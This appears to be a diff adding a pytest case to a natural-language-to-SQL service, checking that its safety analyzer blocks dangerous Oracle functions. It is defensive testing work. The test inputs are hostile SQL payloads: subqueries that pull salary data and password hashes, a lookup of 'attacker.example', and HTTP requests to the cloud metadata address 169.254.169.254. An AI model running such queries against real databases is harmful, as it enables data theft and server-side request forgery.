@@ -89,3 +89,56 @@ def test_analyze_sql_keeps_leading_comment_select_executable() -> None:
     assert analysis.safety.blocked_reason == ""
     assert analysis.safety.is_safe is True
     assert analysis.executable_sql == sql
+
+
+@pytest.mark.parametrize(
+    ("sql", "function_name"),
+    [
+        (
+            "SELECT DBMS_XMLGEN.GETXML('SELECT * FROM APP.SALARY') "
+            "FROM APP.ORDERS WHERE ROWNUM = 1",
+            "DBMS_XMLGEN.GETXML",
+        ),
+        (
+            "SELECT DBMS_XMLQUERY.GETXML('SELECT * FROM APP.SALARY') FROM APP.ORDERS",
+            "DBMS_XMLQUERY.GETXML",
+        ),
+        (
+            "SELECT DBMS_XMLGEN.GETXML('SELECT PASSWORD_HASH FROM NL2SQL_APP_USERS') FROM DUAL",
+            "DBMS_XMLGEN.GETXML",
+        ),
+        (
+            "SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.example') FROM APP.ORDERS",
+            "UTL_INADDR.GET_HOST_ADDRESS",
+        ),
+        (
+            "SELECT HTTPURITYPE('http://169.254.169.254/').GETCLOB() FROM APP.ORDERS",
+            "HTTPURITYPE.GETCLOB",
+        ),
+        (
+            "SELECT UTL_HTTP.REQUEST('http://169.254.169.254/') FROM APP.ORDERS",
+            "UTL_HTTP.REQUEST",
+        ),
+        (
+            "SELECT DBMS_METADATA.GET_DDL('TABLE', 'ORDERS') FROM APP.ORDERS",
+            "DBMS_METADATA.GET_DDL",
+        ),
+    ],
+)
+def test_analyze_sql_blocks_dangerous_oracle_functions(
+    sql: str,
+    function_name: str,
+) -> None:
+    service = Nl2SqlService(store=MemoryNl2SqlStore())
+
+    analysis = service.analyze_sql(
+        sql,
+        AllowedObjects(table_names=["APP.ORDERS", "DUAL"]),
+        100,
+    )
+
+    assert analysis.safety.is_select_only is True
+    assert analysis.safety.is_safe is False
+    assert function_name in analysis.safety.blocked_reason
+    assert "危険な Oracle 関数" in analysis.safety.blocked_reason
+    assert "許可されていない表" not in analysis.safety.blocked_reason
